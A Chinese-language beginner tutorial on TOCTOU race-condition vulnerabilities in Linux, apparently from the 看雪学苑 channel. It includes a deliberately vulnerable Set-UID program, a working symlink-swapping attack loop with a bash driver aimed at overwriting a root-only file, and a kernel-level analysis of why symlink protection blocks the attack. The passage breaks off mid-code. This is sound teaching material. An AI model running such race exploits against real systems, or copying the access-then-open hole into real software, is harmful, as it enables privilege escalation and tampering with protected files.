---
title: PWN入门：三打竞态条件漏洞-TOCTOU
url: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458587787&idx=1&sn=41d2b407676f2bc7e7673d21eaf675a4&chksm=b18c220186fbab17f3c5bf0239ed522d335f223892e09b156878039202cbcf6729db4b62bb7f&scene=58&subscene=0#rd
source: 看雪学苑
date: 2024-12-27
fetch_date: 2025-10-06T19:37:35.553775
---

# PWN入门：三打竞态条件漏洞-TOCTOU

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8EficNsfyv6H2XuGwTPCuDQ5ic9DYsB0icFuh1s50HhQttPF6fdlSobglE5wZia2cMKnWSCEADiaiarj81w/0?wx_fmt=jpeg)

# PWN入门：三打竞态条件漏洞-TOCTOU

福建炒饭乡会

看雪学苑

```
一

竟态条件漏洞初探
```

有资源就有竞争，在计算机的世界中也是如此，Linux系统中最为常见的一种情况就是多个线程使用同一资源带来争抢问题。

那么我们应该怎么让恶意程序赢得资源的竞争并做出一些坏事呢？那么是不是只能借助线程达到目的，进程就不行呢？

首先我们先了解一下Linux中线程与进程。

## Linux中的线程

在计算机系统当中，不止允许多个进程同时允许，也允许一个进程同时跑多个任务，负责每个任务的主体也被称作是线程。

### LWP的由来

在Linux系统当中不管是线程还是进程都是通过`struct task_struct`结构体进行描述的，因此从内核的角度来看线程即进程，Linux系统当中也把线程称作是轻量级进程`LWP Light Weight Process`，那么线程到底轻量级在哪里呢？

在Linux中可以通过`ps -eL`命令查看线程信息。

```
-e：展示全部进程
-L：展示LWP和NLWP

ps -eL
5627    5627 pts/5    00:00:00 xxx
5627    5628 pts/5    00:00:00 xxx
```

###

### 进程与线程的创建

进程和线程除了抽象管理模型一致外，在创建方法上也保持着高度的一致，它们都是通过`clone`、`fork`等系统调用进行创建的。

如果使用的Linux版本较新，通过strace工具追踪系统调用时，可以发现`clone`、`fork`等创建进程的系统调用，最终都会使用`clone3`发起申请。

```
#define __NR_clone 56
#define __NR_fork 57
#define __NR_vfork 58

#define __NR_clone3 435
```

`fork`创建出来的进程可以看作是父进程的副本，它独立于父进程，拥有自己的内存空间。`vfork`创建出来的子进程仍是父进程的副本，但它与父进程共享内存空间。

`clone`创建进程时也会复制父进程，但它允许子进程使用父进程的上下文信息。

`vfork`还有一个特别之处，当`vfork`创建出来的子进程启动后，父进程会被挂起，等到子进程退出或再创建新进程时，父进程才会再次启动。

通过`execve`创建的进程最为特殊，它会将新程序的ELF文件加载到当前进程空间，并从入口出执行程序。

```
#define __NR_execve 59
```

###

### 线程和进程的联系

从上面我们可以知道进程的创建分成根据父进程复制和从头加载ELF文件两大类，但不管什么方式创建的进程同时通过`task_struct`结构体描述的，`task_struct`中有一个名为`tasks`的成员，它是一个双向链表，通过遍历该链表，可以从得到Linux中的所有的进程。

`task_struct`结构体中的`real_parent`成员和`parent`成员指明了父进程的位置，`parent`成员一般与`real_parent`时一样的，但当进程被`ptrace`附加调试时，`parent`成员就变成了调试器进程的`task_struct`，而`real_parent`会始终指明真实的父进程。

`task_struct`结构体中的`children`成员和`sibling`成员是非常容易被混淆的概念，其中`chlidren`成员代表自己的子进程列表，而`sibling`成员则代表与自己同级的子进程列表。

`group_leader`成员指向的是主线程。

```
struct task_struct {
    ......
    struct task_struct __rcu *real_parent;
    struct task_struct __rcu *parent;
    struct list_head children;
    struct list_head sibling;
    struct task_struct *group_leader;
    ......
    struct list_head tasks;
    ......
}
```

###

### 进程与线程的区别

前面已经提到过，从内核角度上看并不差别，只不过线程间的`task_struct`具有联系，且线程间可以进行资源共享，这是不同进程间无法直接做到的。

## 竞态条件漏洞的产生 - TOCTOU

当进程访问资源时，一般都先需要通过检查，检查完成后才会正式开始对资源进行操作。按照进程的期望来讲，从进程发出访问请求的那一刻起，资源就不能再被其他进程访问了。

但现实往往不是这样的，资源被检查时是可以被其他进程操作的，假如我们利用检查的时间对对资源做一些手脚，那么就会导致进程操作错误的资源，这类问题也被称作是`TOCTOU time of check, time of use`。

```
二

示例讲解
```

##

## 环境介绍

在`tmp`目录中存在着一个极其重要的文件`private_data.bin`，它里面存储着影响世界安危的数据（据小道消息传闻，它存储的是引爆美国核弹的密码）。

为了保护这段数据，系统给它设置了只有`root`用户才可读可写的权限。

```
设置权限的命令：
sudo chown root:root ./private_data.bin
sudo chmod 600 ./private_data.bin

文件权限展示：
ls -lh /tmp/
-rw------- 1 root     root     13 Nov 17 00:32 private_data.bin

普通用户读取结果：
cat ./private_data.bin
cat: ./private_data.bin: Permission denied
```

通过Set-UID程序`sudo`访问文件后，发现该数据是几乎不可能被破译的密码。

我们可以确信这是世界上强度最高的密码了。

```
sudo cat ./private_data.bin
1234567890
```

当前系统中存在着一个程序，该程序做的事情比较简单，即确认文件`AbCd`是否可以访问，然后从标准输入`stdin`中读取输入内容，最后写入文件`AbCd`。

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

#define MY_FILE_NAME	"/tmp/AbCd"

int main(void)
{
    char buf[0x100];
    FILE* my_fp;

    if (!access(MY_FILE_NAME, F_OK | R_OK | W_OK)) {
        fgets(buf, 0x100, stdin);

        my_fp = fopen(MY_FILE_NAME, "r+");
        fwrite(buf, sizeof(char), strnlen(buf, 0x100), my_fp);
        fclose(my_fp);
    }
    else {
        printf("cannot access %s, errno %d\n", MY_FILE_NAME, errno);
    }
}
```

而且该程序属于`root`用户的Set-UID程序。

```
程序权限的设置方法：
sudo chown root:root ./race_condition_example4vuln
sudo chmod 4755 ./race_condition_example4vuln

程序的权限展示：
ls -lh ./race_condition_example4vuln
-rwsr-xr-x 1 root root 19K Nov 16 01:32 ./race_condition_example4vuln
```

##

## 构造恶意程序

从上方程序中我们可以发现，它先通过`access`检查权限（阶段1），`access`接口确认文件和进程的真实ID匹配之后，才会打开文件进行写操作（阶段2）。

那么存不存在这样的一种情况，检查的文件是与进程发起者属于同用户的，但打开的文件属于`root`用户的呢？

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8EficNsfyv6H2XuGwTPCuDQ5Tu8I5vNe3d3w6njKgxvV0vfFIj3NNZUFicYDJ4O8nSWibNZIemBgXR7A/640?wx_fmt=other&from=appmsg)

当然可以，虽然上方程序中制定了文件路径，但是Linux当中存在着一种名为软链接的文件，软连接提供了文件指向任意文件的能力。

此时我们假设，阶段1时文件`./AbCd`指向一个当前用户可以访问的文件，在检查权限操作开始时，我们就趁着文件被打开前间隙将文件掉包，让进程打开高特权文件。

```
#include <unistd.h>

#define TARGET_FILE_NAME		"/tmp/AbCd"
#define ACCESSIBLE_FILE_NAME	"/dev/null"
#define PRIVILEGE_FILE_NAME		"/tmp/private_data.bin"

void symlink_set(const char* taget_name, const char* src_name)
{
    unlink(src_name);
    symlink(taget_name, src_name);

    usleep(1000);
}

int main(void)
{
    while (1) {
        symlink_set(ACCESSIBLE_FILE_NAME, TARGET_FILE_NAME);
        symlink_set(PRIVILEGE_FILE_NAME, TARGET_FILE_NAME);
    }

    return 0;
}
```

通过上面的分析我们可以构造出恶意程序，该恶意程序会持续做两个操作，一是让`AbCd`文件指向一个所有用户都可读可写的文件`/dev/null`，二是让`AbCd`文件指向疑似包含美国核弹密码的文件`/tmp/private_data.bin`。

```
ls -lh /dev/null
crw-rw-rw- 1 root root 1, 3 Nov 16 21:53 /dev/null
```

我们通过下方脚本让普通程序不断运行，而攻击程序本身自带循环，直接运行即可。

```
#!/bin/bash

CHECK_CMD="ls -l /tmp/private_data.bin"
old_status=$($CHECK_CMD)
new_status=$($CHECK_CMD)

while [ "$old_status" == "$new_status" ]
do
    ./race_condition_example4vuln < "bad_data"

    new_status=$($CHECK_CMD)
done

echo "ok!"
```

`bad_data`文件中存储的内容如下所示。

```
cat bad_data
i am a hacker
```

##

## 何人护驾？

通过运行普通程序和恶意程序等待较长一段时间后，会发现`private_data.bin`根本就不会被替换，而且会持续出现段错误导致崩溃的情况，这是为什么呢？

```
./vuln_run.sh: line 12:  7332 Segmentation fault      (core dumped) ./race_condition_example4vuln < "bad_data

dmesg信息：
[12923.446950] race_condition_[7332]: segfault at 0 ip 00007fc40bad4ace sp 00007ffcecf73d20 error 4 in libc.so.6[7fc40ba84000+155000] likely on CPU 3 (core 3, socket 0)
```

现在的Linux内核越来越贴心了，我们可以直接在`dmesg`信息中看到用户态程序的崩溃信息。该信息是当内核捕捉到异常后，通过`mm/fault.c`中的`show_signal_msg`函数打印的异常信息。

从上面的异常信息中，我们可以看到崩溃发生于GLibC库的可执行段中偏移`0x50ace`的位置，`cr2`寄存器的数值是0x0（`segfault at [cr2]`），空指针就是导致段错误的根源。

当然即使没有内核打印，我们也可以通过信号捕捉机制获取栈回溯。

```
读取cr2寄存器数值的地方：
DEFINE_IDTENTRY_RAW_ERRORCODE(exc_page_fault)
{
    unsigned long address = read_cr2();
    ......
}

GDB根据地址解析出来的符号信息：
(gdb) info symbol 0x7fa8d1158000+0x50ace
fwrite + 30 in section .text of /lib/x86_64-linux-gnu/libc.so.6

打印出来的栈回溯
my_sigenv_handle (signo=11) at vuln.c:12
(gdb) bt
#0  my_sigenv_handle (signo=11) at vuln.c:12
#1  <signal handler called>
#2  0x00007f6236dddace in __GI__IO_fwrite
#3  0x0000556d041642ba in main () at vuln.c:29
```

咦！`fwrite`怎么会出错呢，仔细观察`fwrite`函数传递的参数，大胆猜想，难道最后一个参数`my_fp`是空指针？

添加一下打印，果然如此！

```
添加的打印语句：
printf("file pointer 0x%lx\n", (unsigned long)my_fp);

打印出来的信息：
file pointer 0x0
```

`my_fp`是空指针，代表`fopen`打开文件失败了，但是打开文件这样一个基础且被大量使用的内容怎么会失败呢？让我们追踪一下内核打开文件的流程。

```
[12125.941199]  <TASK>
[12125.941201]  dump_stack_lvl+0x44/0x5c
[12125.941204]  ? step_into+0x1/0x760
[12125.941207]  stack_dump_by_kprobe_pre+0x71/0x80 [lde]
[12125.941212]  kprobe_ftrace_handler+0x10b/0x1b0
[12125.941215]  0xffffffffc02f20c8
[12125.941219]  ? step_into+0x1/0x760
[12125.941222]  step_into+0x5/0x760
[12125.941224]  link_path_walk.part.0.constprop.0+0x246/0x3b0
[12125.941226]  ? srso_alias_return_thunk+0x5/0x7f
[12125.941229]  ? path_init+0x287/0x3c0
[12125.941232]  path_openat+0xae/0x1260
[12125.941235]  ? tomoyo_check_open_permission+0xaf/0x190
[12125.941239]  do_filp_open+0xaf/0x160
[12125.941247]  do_sys_openat2+0xaf/0x170
[12125.941250]  __x64_sys_openat+0x6a/0xa0
[12125.941253]  do_syscall_64+0x55/0xb0
```

当用户态程序发出系统调用后，内核会通过`do_filp_open`函数开始打开文件，内核一开始接受的只是一个文件路径，为了获取文件节点对应`struct dentry`结构体，`link_path_walk`函数会对文件路径进行解析，文件路径可以由多个节点组成，`link_path_walk`函数会找到最终节点，然后交给`walk_component`函数处理。

`walk_component`函数会判断最终节点是否有效，发现节点有效后会通过`step_into`函数判断最终节点是否为软链接文件，如果是节点内核会考虑要不要解析软链接文件，`pick_link`函数就是判断解不解析的关键。

```
walk_component
    -> step_into
        -> pick_link
            -> may_follow_link
                -> sysctl_protected_symlinks
```

决定软链接文件是否解析的原因有许多，其中一个就是`WALK_TRAILING`标志，该标准代表当前节点是软链接文件的最终阶段，如果是最终节点就通过`may_follow_link`函数进行检查。

`may_follow_link`函数分成两步，一是判断`sysctl_protected_symlinks`是否为0，二是进行权限判断（当前用户的文件uid和节点uid是否一致，父目录非粘滞目录且可写，父目录uid和节点uid是否一致）。

```
static const char *pick_link(struct nameidata *nd, struct path *link,
           ...